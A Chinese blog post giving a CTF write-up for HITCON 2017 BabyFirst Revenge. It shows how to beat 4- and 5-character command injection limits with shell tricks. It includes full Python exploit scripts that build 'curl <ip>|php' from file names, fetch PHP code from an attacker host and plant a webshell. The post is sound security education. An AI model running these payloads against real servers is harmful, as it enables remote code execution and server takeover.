<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Time is of the essence."><title>如何绕过四个字符限制getshell | findneo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">如何绕过四个字符限制getshell</h1><a id="logo" href="/.">findneo</a><p class="description">Time is of the essence.</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">如何绕过四个字符限制getshell</h1><div class="post-meta">Nov 10, 2017<span> | </span><span class="category"><a href="/categories/社区投稿/">社区投稿</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#热身"><span class="toc-number">2.</span> <span class="toc-text">热身</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#冷静分析"><span class="toc-number">3.</span> <span class="toc-text">冷静分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IP的等价表示法"><span class="toc-number">3.1.</span> <span class="toc-text">IP的等价表示法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#从网络下载文件"><span class="toc-number">3.2.</span> <span class="toc-text">从网络下载文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用续行符拆分命令成多行"><span class="toc-number">3.3.</span> <span class="toc-text">利用续行符拆分命令成多行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#用两个字符在Linux下创建文件"><span class="toc-number">3.4.</span> <span class="toc-text">用两个字符在Linux下创建文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#将命令执行结果重定向到文件"><span class="toc-number">3.5.</span> <span class="toc-text">将命令执行结果重定向到文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用重定向向文件追加内容"><span class="toc-number">3.6.</span> <span class="toc-text">利用重定向向文件追加内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#删除文件"><span class="toc-number">3.7.</span> <span class="toc-text">删除文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ls-的文件排列顺序"><span class="toc-number">3.8.</span> <span class="toc-text">ls 的文件排列顺序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始表演"><span class="toc-number">4.</span> <span class="toc-text">开始表演</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#运行效果"><span class="toc-number">4.1.</span> <span class="toc-text">运行效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#挑战升级"><span class="toc-number">5.</span> <span class="toc-text">挑战升级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#热烈分析"><span class="toc-number">6.</span> <span class="toc-text">热烈分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#dir"><span class="toc-number">6.1.</span> <span class="toc-text">dir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rev"><span class="toc-number">6.2.</span> <span class="toc-text">rev</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开始挑战"><span class="toc-number">7.</span> <span class="toc-text">开始挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#运行效果-1"><span class="toc-number">7.1.</span> <span class="toc-text">运行效果</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后记"><span class="toc-number">8.</span> <span class="toc-text">后记</span></a></li></ol></div></div><div class="post-content"><blockquote>
<p>本文首发于安全客 (<a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="external">https://www.anquanke.com/post/id/87203</a>)</p>
</blockquote>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>本文主要整理如何巧用Linux命令绕过命令注入点的字符数量限制，内容围绕HITCON CTF 2017 的两道题展开，先讲五个字符的限制，再讲四个字符的。在此感谢下主办方分享这么有趣的点子。</p>
<h3 id="热身"><a href="#热身" class="headerlink" title="热身"></a><strong>热身</strong></h3><p>问题的起源是 HITCON CTF 2017 的 BabyFirst Revenge 题，题目的主要代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">BabyFirst Revenge</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<h3 id="冷静分析"><a href="#冷静分析" class="headerlink" title="冷静分析"></a><strong>冷静分析</strong></h3><p>目标环境根据每个访问者的IP为其在sandbox里新建一个文件夹并作为其工作目录，接受并执行访问者提交的命令。访问者可随时通过提交reset来重置环境。这是个有限制无回显的后门，命令长度要求小于等于5 ，我们会希望利用这一点撕开口子，往服务器上写一个自己的木马，从而扩大命令执行范围。</p>
<p>我们所面临的最主要问题是能够执行的命令长度太短，因此考虑把命令写进文件里再执行，命令的功能是下载我们指定的文件。</p>
<p>在此之前，先做些知识铺垫。</p>
<h4 id="IP的等价表示法"><a href="#IP的等价表示法" class="headerlink" title="IP的等价表示法"></a><strong>IP的等价表示法</strong></h4><p>IP地址本质上就是一个整数，只是通常用点分十进制表示，以至于我们反而不太熟悉它本来的样子。只要必要，我们可以用十六进制、长整数、八进制表示IP，大部分情况下效果是相同的。</p>
<p><img src="t010e7a86cdf1618e75.png" alt="t010e7a86cdf1618e75"></p>
<p>它们之间的转换也很方便：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ip = <span class="string">'127.0.0.1'</span></div><div class="line"><span class="comment"># 十六进制</span></div><div class="line"><span class="keyword">print</span> <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)])</div><div class="line"><span class="comment"># 长整数</span></div><div class="line"><span class="keyword">print</span> int(<span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)]), <span class="number">16</span>)</div><div class="line"><span class="comment"># 八进制</span></div><div class="line"><span class="keyword">print</span> <span class="string">'0'</span> + oct(int(<span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line">                   <span class="keyword">for</span> i <span class="keyword">in</span> ip.split(<span class="string">'.'</span>)]), <span class="number">16</span>))</div></pre></td></tr></table></figure>
<h4 id="从网络下载文件"><a href="#从网络下载文件" class="headerlink" title="从网络下载文件"></a><strong>从网络下载文件</strong></h4><p><img src="t0179a43f9481b4fbc6.png" alt="t0179a43f9481b4fbc6.png"></p>
<h4 id="利用续行符拆分命令成多行"><a href="#利用续行符拆分命令成多行" class="headerlink" title="利用续行符拆分命令成多行"></a><strong>利用续行符拆分命令成多行</strong></h4><p><img src="t01d2eac72941e42be9.png" alt="t01745a941a746a7ac0.png"></p>
<h4 id="用两个字符在Linux下创建文件"><a href="#用两个字符在Linux下创建文件" class="headerlink" title="用两个字符在Linux下创建文件"></a><strong>用两个字符在Linux下创建文件</strong></h4><p><img src="t019808b722225de73d.png" alt="t01485c8bfc8fbf987f.png"></p>
<h4 id="将命令执行结果重定向到文件"><a href="#将命令执行结果重定向到文件" class="headerlink" title="将命令执行结果重定向到文件"></a><strong>将命令执行结果重定向到文件</strong></h4><p><img src="t012de068258a2e3d04.png" alt="http://p9.qhimg.com/t01e45c7a16d86c4e2c.png"></p>
<h4 id="利用重定向向文件追加内容"><a href="#利用重定向向文件追加内容" class="headerlink" title="利用重定向向文件追加内容"></a><strong>利用重定向向文件追加内容</strong></h4><p><img src="t015f5da0f73df752b7.png" alt="http://p2.qhimg.com/t0125c23ce2f3d45621.png"></p>
<h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a><strong>删除文件</strong></h4><p><img src="t0121856133157c3f34.png" alt="http://p4.qhimg.com/t01e267cc27d6277631.png"></p>
<h4 id="ls-的文件排列顺序"><a href="#ls-的文件排列顺序" class="headerlink" title="ls 的文件排列顺序"></a><strong>ls 的文件排列顺序</strong></h4><p>一句alphabetical耐人寻味，不过大致顺序就是如下图所示。</p>
<p><img src="t01c4dd700d11f91860.png" alt="http://p7.qhimg.com/t01e104d2e591a66fcd.png"></p>
<hr>
<h3 id="开始表演"><a href="#开始表演" class="headerlink" title="开始表演"></a><strong>开始表演</strong></h3><p>假设我有一台目标服务器能够访问到的公网主机，为了方便我把该主机IP转换成长整数，然后利用以上的知识将 curl ip &gt; A 用续行方式切割成多行写进文件 A ，然后执行 sh A 就可以下载到预先放在公网主机上的文件并且覆盖本地的文件A，而下载下来的文件内容是用来写PHP木马的PHP代码，我再执行 php A就可以写个自己的webshell进去啦。</p>
<p><img src="t016294d3a767429eab.png" alt="http://p8.qhimg.com/t0106f100f423201580.png"></p>
<p>这里比较取巧的是我的公网IP转成长整形恰好能分割成顺序的四段，如果构造不出来，可以试试十六进制，八进制，找台能用的主机等等：）或者继续往下看，还会有其他办法。</p>
<p>另外，其实GET也是能用的，只是目标主机里没有安装所以这题不能用。</p>
<p>接下来让我们完成最后30%的工作，写个exp。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">url = <span class="string">'http://52.199.204.34/'</span></div><div class="line"><span class="comment"># 查询自己的IP</span></div><div class="line">ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</div><div class="line">sandbox = url + <span class="string">'sandbox/'</span> + hashlib.md5(<span class="string">'orange'</span> + ip).hexdigest() + <span class="string">'/'</span></div><div class="line"> </div><div class="line">reset = url + <span class="string">'?reset'</span></div><div class="line">cmd = url + <span class="string">'?cmd='</span></div><div class="line">build = [<span class="string">'&gt;cur\',</span></div><div class="line"><span class="string">         '</span>&gt;l \<span class="string">',</span></div><div class="line"><span class="string">         '</span>ls&gt;A<span class="string">',</span></div><div class="line"><span class="string">         '</span>rm c*<span class="string">',</span></div><div class="line"><span class="string">         '</span>rm l*<span class="string">',</span></div><div class="line"><span class="string">         '</span>&gt;<span class="number">105</span>\<span class="string">',</span></div><div class="line"><span class="string">         '</span>&gt;<span class="number">304</span>\<span class="string">',</span></div><div class="line"><span class="string">         '</span>&gt;<span class="number">301</span>\<span class="string">',</span></div><div class="line"><span class="string">         '</span>&gt;<span class="number">9</span>&gt;\<span class="string">',</span></div><div class="line"><span class="string">         '</span>ls&gt;&gt;A<span class="string">',</span></div><div class="line"><span class="string">         '</span>sh A<span class="string">',</span></div><div class="line"><span class="string">         '</span>php A<span class="string">'</span></div><div class="line"><span class="string">         ]</span></div><div class="line"><span class="string"># 如果目标服务器有GET，这个也是可以打的</span></div><div class="line"><span class="string"># build = ['</span>&gt;GE\<span class="string">',</span></div><div class="line"><span class="string">#          '</span>&gt;T\ \<span class="string">',</span></div><div class="line"><span class="string">#          '</span>ls&gt;A<span class="string">',</span></div><div class="line"><span class="string">#          '</span>rm G*<span class="string">',</span></div><div class="line"><span class="string">#          '</span>rm T*<span class="string">',</span></div><div class="line"><span class="string">#          '</span>&gt;<span class="number">105</span>\<span class="string">',</span></div><div class="line"><span class="string">#          '</span>&gt;<span class="number">304</span>\<span class="string">',</span></div><div class="line"><span class="string">#          '</span>&gt;<span class="number">301</span>\<span class="string">',</span></div><div class="line"><span class="string">#          '</span>&gt;<span class="number">9</span>&gt;\<span class="string">',</span></div><div class="line"><span class="string">#          '</span>ls&gt;&gt;A<span class="string">']</span></div><div class="line"><span class="string">r.get(reset)</span></div><div class="line"><span class="string">for i in build:</span></div><div class="line"><span class="string">    s = r.get(cmd + i)</span></div><div class="line"><span class="string">    print '</span>[%s]<span class="string">' % s.status_code, s.url</span></div><div class="line"><span class="string"> </span></div><div class="line">s = r.get(sandbox + 'fun.php?cmd=uname -a')</div><div class="line"><span class="keyword">print</span> <span class="string">'n'</span> + <span class="string">'[%s]'</span> % s.status_code, s.url</div><div class="line"><span class="keyword">print</span> s.text</div></pre></td></tr></table></figure>
<h4 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h4><p><img src="t014cfd9d61e5c45b44.png" alt="http://p1.qhimg.com/t013370047191f9904f.png"></p>
<hr>
<h3 id="挑战升级"><a href="#挑战升级" class="headerlink" title="挑战升级"></a><strong>挑战升级</strong></h3><p>这篇文章有趣的地方才刚刚开始。</p>
<p>代码只改了一个字符，但趣味已经不在一个量级。一脸懵逼的我看了大佬们的wp后兴奋不已。</p>
<p>BabyFirst Revenge v2：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>])</div><div class="line"> </div><div class="line"><span class="meta">    @mkdir($sandbox)</span></div><div class="line"><span class="meta">    @chdir($sandbox)</span></div><div class="line">    <span class="keyword">if</span> (isset($_GET[<span class="string">'cmd'</span>]) &amp; &amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</div><div class="line"><span class="meta">        @exec($_GET['cmd'])</span></div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isset($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line"><span class="meta">        @exec('/bin/rm -rf ' . $sandbox)</span></div><div class="line">    &#125;</div><div class="line">    highlight_file(__FILE__)</div></pre></td></tr></table></figure>
<h3 id="热烈分析"><a href="#热烈分析" class="headerlink" title="热烈分析"></a><strong>热烈分析</strong></h3><p>只有四个字符的施展空间意味着我们能做的事情少之又少，但Linux本身的简洁给了我们机会。</p>
<p>突破之旅从神奇的星号 * 开始。</p>
<p><img src="t01c68ec189f2c38155.png" alt="http://p1.qhimg.com/t011d2b1095c9235710.png"></p>
<p>经过简单测试我们猜测 * 的作用相当于 <code>ls</code> 。这其实相当厉害，我们本就基本上可以创建任意名字的短文件，现在又可以一个字符就把这些文件名连起来当作命令执行，这提供了很大的想象空间。</p>
<p><img src="t01fbeb47c643a3f4fd.png" alt="http://p1.qhimg.com/t016acaa6a8c9c4497c.png"></p>
<p>还有本质上一样但现象很有趣的，待会儿会用到：</p>
<p><img src="t01cdd7b9abeb575d5f.png" alt="http://p7.qhimg.com/t015afceef8c0976153.png"></p>
<p>虽然这些特技提供了一些可能性，但是 ls 列出的文件顺序问题仍然是个挑战，我们很难在 alphabetical 序的基础上构造出有用的命令。</p>
<p>写入时间是我们可以控制的，如果能执行 ls –t（将文件按时间排序输出），那么只要把想执行的命令分割成若干段然后逆序写入，就可以随心所欲地构造出任意命令。考虑到 ls -t 本身就已经有4个字符了，我们故技重施，先将 ls -t &gt; f 写入文件 g 中，然后执行 sh g 即可将我们分段逆序写入的命令拼接起来。</p>
<p>在开始操作前，再介绍两个会用到的命令：dir 和 rev。</p>
<hr>
<h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a><strong>dir</strong></h4><p>在GNU文档中有下图这样的描述：</p>
<p><img src="https://p5.ssl.qhimg.com/t01406e4dcc8e6ff0f7.png" alt="http://p1.qhimg.com/t014c12aa56fd9386f9.png"></p>
<p>虽然基本上和 ls 一样，但有两个好处，一是开头字母是d ，这使得它在 alphabetical 序中靠前，二是按列输出，不换行。</p>
<h4 id="rev"><a href="#rev" class="headerlink" title="rev"></a><strong>rev</strong></h4><p>这个前面出场过，可以反转文件每一行的内容。</p>
<p><img src="t010c4a372f495ce020.png" alt="http://p8.qhimg.com/t01184834f69bddb51a.png"></p>
<p>实验一下：</p>
<p><img src="t016a0cf34a18724b08.png" alt="http://p2.qhimg.com/t0192fac539940680bc.png"></p>
<h3 id="开始挑战"><a href="#开始挑战" class="headerlink" title="开始挑战"></a><strong>开始挑战</strong></h3><p>需要知道的命令和 tips 都已经介绍了，下面是代码和解释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*-coding:utf8-*-</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">target = <span class="string">'http://52.197.41.31/'</span></div><div class="line"> </div><div class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></div><div class="line">shell_ip = <span class="string">'xx.xx.xx.xx'</span></div><div class="line"> </div><div class="line"><span class="comment"># 本机IP</span></div><div class="line">your_ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</div><div class="line"> </div><div class="line"><span class="comment"># 将shell_IP转换成十六进制</span></div><div class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</div><div class="line"> </div><div class="line">reset = target + <span class="string">'?reset'</span></div><div class="line">cmd = target + <span class="string">'?cmd='</span></div><div class="line">sandbox = target + <span class="string">'sandbox/'</span> + </div><div class="line">    hashlib.md5(<span class="string">'orange'</span> + your_ip).hexdigest() + <span class="string">'/'</span></div><div class="line"> </div><div class="line"><span class="comment"># payload某些位置的可选字符</span></div><div class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</div><div class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</div><div class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></div><div class="line"> </div><div class="line">payload = [</div><div class="line">    <span class="string">'&gt;dir'</span>,</div><div class="line">    <span class="comment"># 创建名为 dir 的文件</span></div><div class="line"> </div><div class="line">    <span class="string">'&gt;%s&gt;'</span> % pos0,</div><div class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></div><div class="line"> </div><div class="line">    <span class="string">'&gt;%st-'</span> % pos1,</div><div class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></div><div class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></div><div class="line"> </div><div class="line">    <span class="string">'&gt;sl'</span>,</div><div class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></div><div class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></div><div class="line"> </div><div class="line">    <span class="string">'*&gt;v'</span>,</div><div class="line">    <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></div><div class="line">    <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></div><div class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></div><div class="line"> </div><div class="line">    <span class="string">'&gt;rev'</span>,</div><div class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></div><div class="line"> </div><div class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</div><div class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></div><div class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></div><div class="line"> </div><div class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></div><div class="line">    <span class="string">'&gt;p'</span>,</div><div class="line">    <span class="string">'&gt;ph\',</span></div><div class="line"><span class="string">    '</span>&gt;|\<span class="string">',</span></div><div class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[8:10],</span></div><div class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[6:8],</span></div><div class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[4:6],</span></div><div class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[2:4],</span></div><div class="line"><span class="string">    '</span>&gt;%s\<span class="string">' % ip[0:2],</span></div><div class="line"><span class="string">    '</span>&gt; \<span class="string">',</span></div><div class="line"><span class="string">    '</span>&gt;rl\<span class="string">',</span></div><div class="line"><span class="string">    '</span>&gt;cu\<span class="string">',</span></div><div class="line"><span class="string"> </span></div><div class="line"><span class="string">    '</span>sh <span class="string">' + pos2,</span></div><div class="line"><span class="string">    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></div><div class="line"><span class="string">    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></div><div class="line"><span class="string">    '</span>sh <span class="string">' + pos0,</span></div><div class="line"><span class="string">    # sh f 执行curl命令，下载文件，写入木马。</span></div><div class="line"><span class="string">]</span></div><div class="line"><span class="string"> </span></div><div class="line"><span class="string">s = r.get(reset)</span></div><div class="line"><span class="string">for i in payload:</span></div><div class="line"><span class="string">    assert len(i) &lt;= 4</span></div><div class="line"><span class="string">    s = r.get(cmd + i)</span></div><div class="line"><span class="string">    print '</span>[%d]<span class="string">' % s.status_code, s.url</span></div><div class="line"><span class="string">    sleep(0.1)</span></div><div class="line">s = r.get(sandbox + 'fun.php?cmd=uname -a')</div><div class="line"><span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</div><div class="line"><span class="keyword">print</span> s.text</div></pre></td></tr></table></figure>
<h4 id="运行效果-1"><a href="#运行效果-1" class="headerlink" title="运行效果"></a>运行效果</h4><p><img src="t01d42702502e8f186e.png" alt="http://p8.qhimg.com/t01b1145c403a84ced2.png"></p>
<hr>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a><strong>后记</strong></h3><p>我相信除了文中给出的方法外一定还有一些奇招，大家可以多多探索，可以围观HITCON CTF 2107的<a href="http://t.cn/RlNVPfp" target="_blank" rel="external">官方解答区</a>，还可以学习下Phithon师傅的《<a href="http://t.cn/RlNcllC" target="_blank" rel="external">小密圈里的那些奇技淫巧</a>》 中与本文主题相关的部分。</p>
<p>最后，如果关于文章内容有任何建议或疑惑，你可以在<a href="https://findneo.github.io/">https://findneo.github.io/</a> 联系本文作者。感谢阅读o/</p>
<hr>
<p>本文由<strong>安全客</strong>原创发布<br>如若转载，请注明出处： <a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="external">https://www.anquanke.com/post/id/87203</a></p>
<p>安全客 - 有思想的安全新媒体</p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a class="article-share-link" data-url="https://findneo.github.io/2017/11/171110Bypass4CLimit/" data-id="cjeqwwh9m0002mwgyryanh812" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3aS24jMQwFQN//0p7tABn3vEe5A7RUWgVO/0oLghT5esXr/WP9/Xt+/acrf971umNhYGA8lvG+XMkLkg+9fuanrUm+DQMD4xxGEgoTwDU+B7fvxcDAwLh+dJ7Stc/BwMDAWGHkSV5elGJgYGBcM5Iidv2ArD2eu6UWx8DAeCCjff1v/n1LfwMDA+NRjHe58oO2JIlMDumir8LAwNiakQe4WeK4HsTzchcDA+McRnKI1obFFjML7hgYGOcwittGgbgdQSuO+TAwMDZltGVnEnzblkNb7v5jczEwMLZmzIYt8he3vFlKioGBcQ5jNlqxMvrQJqD/OYzDwMDYlDFrUq6H0XyPo7swMDAOYKyUryvhOwm1UaDHwMDYmpEc9Cf//dbgV9uKKGZDMDAwtmDMmoh5avjdYYv6cRgYGBsxkg+dtRjz8LpyDQYGxn6MPMjOQm07cDYM1hgYGAcwvnuglhTGeasyKqQxMDC2ZuQDEMnhWlt85gNh7cZhYGDsx1g5aJsVn+3AWdT4xMDAOICRp2ttG3JlXKwOuBgYGAcw2nGKWauybkwG24qBgbEr412uNiDmbc42PS1CLQYGxsMZbZhr08ffLHoxMDD2ZsyCbN6kbFPJNunEwMA4h9GG0dl2rBe0xYAFBgbGwYzZqNbs9xsDLgYGxgGMdlCsTR+vv+RjEYuBgbE1Y1aI5lswK19vOW7DwMB4IGNpUiP49JU2Q5ukYmBgbMf4A5iIslAw7bmSAAAAAElFTkSuQmCC">分享</a><div class="tags"><a href="/tags/命令注入/">命令注入</a></div><div class="post-nav"><a class="pre" href="/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/">HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup</a><a class="next" href="/2017/11/computer-tools/">利器</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" 